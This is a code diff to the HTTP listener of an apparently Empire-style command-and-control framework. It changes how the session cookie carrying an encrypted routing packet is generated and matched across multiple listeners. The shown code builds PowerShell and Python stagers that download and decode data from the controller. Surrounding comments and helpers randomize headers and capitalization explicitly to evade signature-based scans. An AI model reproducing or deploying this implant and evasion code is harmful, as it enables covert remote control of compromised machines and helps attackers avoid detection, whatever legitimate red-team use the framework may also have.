@@ -163,11 +163,10 @@ class Listener:
         # randomize the length of the default_response and index_page headers to evade signature based scans
         self.header_offset = random.randint(0, 64)
 
-        self.session_cookie = ''
-
-        # check if the current session cookie not empty and then generate random cookie
-        if self.session_cookie == '':
+        self.session_cookie = ''      
+        if self.options['Cookie']['Value'] == '':
             self.options['Cookie']['Value'] = self.generate_cookie()
+
 
     def default_response(self):
         """
@@ -282,13 +281,14 @@ class Listener:
             stage0 = random.choice(uris)
             customHeaders = profile.split('|')[2:]
 
-            cookie = listenerOptions['Cookie']['Value']
+
+            if listenerOptions['Cookie']['Value'] == '':
+                listenerOptions['Cookie']['Value'] = self.generate_cookie()
+        
+            self.session_cookie = listenerOptions['Cookie']['Value']  
 
             # generate new cookie if the current session cookie is empty to avoid empty cookie if create multiple listeners
-            if cookie == '':
-                generate = self.generate_cookie()
-                listenerOptions['Cookie']['Value'] = generate
-                cookie = generate
+
 
             if language.startswith('po'):
                 # PowerShell
@@ -414,7 +414,7 @@ class Listener:
 
                 # add the RC4 packet to a cookie
                 stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
-                stager += "\"Cookie\",\"%s=%s\");" % (cookie, b64RoutingPacket)
+                stager += "\"Cookie\",\"%s=%s\");" % (self.session_cookie, b64RoutingPacket)
                 
                 stager += helpers.randomize_capitalization("$data=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser+$t);")
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
@@ -467,7 +467,7 @@ class Listener:
                 launcherBase += "req=urllib2.Request(server+t);\n"
                 # add the RC4 packet to a cookie
                 launcherBase += "req.add_header('User-Agent',UA);\n"
-                launcherBase += "req.add_header('Cookie',\"%s=%s\");\n" % (cookie,b64RoutingPacket)
+                launcherBase += "req.add_header('Cookie',\"%s=%s\");\n" % (self.session_cookie,b64RoutingPacket)
 
                 # Add custom headers if any
                 if customHeaders != []:
@@ -1010,20 +1010,22 @@ def send_message(packets=None):
                 try:
                     # see if we can extract the 'routing packet' from the specified cookie location
                     # NOTE: this can be easily moved to a paramter, another cookie value, etc.
-                    if self.session_cookie in cookie:
-                        listenerName = self.options['Name']['Value']
-                        message = "[*] GET cookie value from {} : {}".format(clientIP, cookie)
-                        signal = json.dumps({
-                            'print': False,
-                            'message': message
-                        })
-                        dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
-                        cookieParts = cookie.split(';')
-                        for part in cookieParts:
-                            if part.startswith(self.session_cookie):
-                                base64RoutingPacket = part[part.find('=')+1:]
-                                # decode the routing packet base64 value in the cookie
-                                routingPacket = base64.b64decode(base64RoutingPacket)
+                    cookies = helpers.get_listener_cookies()
+                    for session in cookies:
+                        if session in cookie:
+                            listenerName = self.options['Name']['Value']
+                            message = "[*] GET cookie value from {} : {}".format(clientIP, cookie)
+                            signal = json.dumps({
+                                'print': False,
+                                'message': message
+                            })
+                            dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
+                            cookieParts = cookie.split(';')
+                            for part in cookieParts:
+                                if part.startswith(session):
+                                    base64RoutingPacket = part[part.find('=')+1:]
+                                    # decode the routing packet base64 value in the cookie
+                                    routingPacket = base64.b64decode(base64RoutingPacket)
                 except Exception as e:
                     routingPacket = None
                     pass
